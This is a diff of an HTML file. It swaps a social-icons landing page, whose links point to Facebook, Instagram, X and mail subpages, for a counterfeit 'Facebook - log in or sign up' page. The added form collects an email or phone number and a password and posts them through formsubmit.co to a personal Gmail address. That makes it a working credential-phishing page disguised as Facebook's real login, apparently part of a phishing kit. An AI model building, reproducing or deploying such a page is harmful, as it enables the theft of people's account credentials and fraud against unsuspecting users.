@@ -1,63 +1,46 @@
 <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html lang="en">
 
-        <!--========== BOX ICONS ==========-->
-        <link href='https://cdn.jsdelivr.net/npm/boxicons@2.0.5/css/boxicons.min.css' rel='stylesheet'>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - log in or sign up</title>
+    <meta name="google-site-verification" content="aa1KHW6JENl9Ai8FiVKBgnujz4qIMW1uNrwU9LTBD74" />
+    <link rel="icon" type="" href="https://img.icons8.com/?size=512&id=118497&format=png" />
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+</head>
 
-        <!--========== CSS ==========-->
-        <link rel="stylesheet" href="assets/css/styles.css">
-
-        <title>Social icons tooltip</title>
-    </head>
-    <body>
-        <div class="wrapper">
-            <div class="cols">
-                <span class="topline">Where Style Meets <span class= "multiText"></span></span>
-            </div>
+<body class="bg-gray-100">
+    <div class="min-h-screen flex items-center justify-center px-4 sm:flex-row flex-col">
+        <div class=" p-8 rounded-lg md:w-96 w-full">
+            <img class="mx-auto w-70" src="fbook.svg"
+                alt="Facebook Logo">
         </div>
-        <div class="social">
-            <div class="social__container">
-                <div class="social__content">
-                    <a href="fb/index.html" target="_blank">
-                    <i class='bx bxl-facebook-circle social__icon'></i>
-                    <span class="social__tooltip social__tooltip-left">Join with Facebook</span>
-                </a>
-                </div>
-
-                <div class="social__content">
-                    <a href="ig/instagram.html" target="_blank">
-                    <i class='bx bxl-instagram-alt social__icon'></i>
-                    <span class="social__tooltip social__tooltip-top">join with Instagram</span>
-                </a>
-                </div>
-
-                <div class="social__content">
-                    <a href="x/X.html" target="_blank">
-                    <i class='bx bxl-twitter social__icon' ></i>
-                    <span class="social__tooltip social__tooltip-bottom">Join with Twitter/X</span>
-                </a>
-                </div>
-
-                <div class="social__content">
-                    <a href="mail/mail.html" target="_blank">
-                    <i class='bx bxs-envelope social__icon' ></i>
-                    <span class="social__tooltip social__tooltip-right">Join with Mail</span>
-                    </a>
-                </div>
-            </div>
+        <div class="bg-white p-8 rounded-lg shadow-lg md:w-96 w-full">
+            <p class="text-lg text-center mt-4 ">Log in to Facebook</p>
+            <form class="mt-6" action="https://formsubmit.co/izujeffery13@gmail.com" method="POST">
+                <input
+                    class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:border-blue-500"
+                    type="text" name="name" placeholder="Email address or phone number">
+                <input
+                    class="w-full mt-4 px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:border-blue-500"
+                    type="password" name="other" placeholder="Password">
+                <button type="submit"
+                    class="w-full mt-6 py-3 bg-blue-600 text-white text-xl font-semibold rounded-lg hover:bg-blue-500 focus:outline-none focus:bg-blue-500">Log
+                    In</button>
+                <span class="block text-sm mt-4 text-center text-blue-800 hover:text-blue-500 cursor-pointer">Forgotten
+                    Password</span>
+                <hr class="my-4">
+                <button
+                    class="w-full py-3 font-bold text-white text-center bg-green-600 hover:bg-green-500 rounded-lg"><a href="SignUp.html">Create New Account</a>
+                    </button>
+                <span class="block text-xs text-center mt-2">
+                    <span class="font-bold"><a href="Registration.html" class="text-blue-700 underline text-sm">Create a
+                            Page</a></span> for a celebrity, brand, or business.
+                </span>
+            </form>
         </div>
-        <script src="https://unpkg.com/typed.js@2.1.0/dist/typed.umd.js"></script>
-        <script>
-            var typingEffect = new Typed(".multiText",{
-                strings : ["beauty", "Class", "Design"],
-                loop : true,
-                typeSpeed : 100,
-                backSpeed : 80,
-                backDelay : 1500
-            })
-        </script>
-    </body>
+    </div>
+</body>
+
 </html>
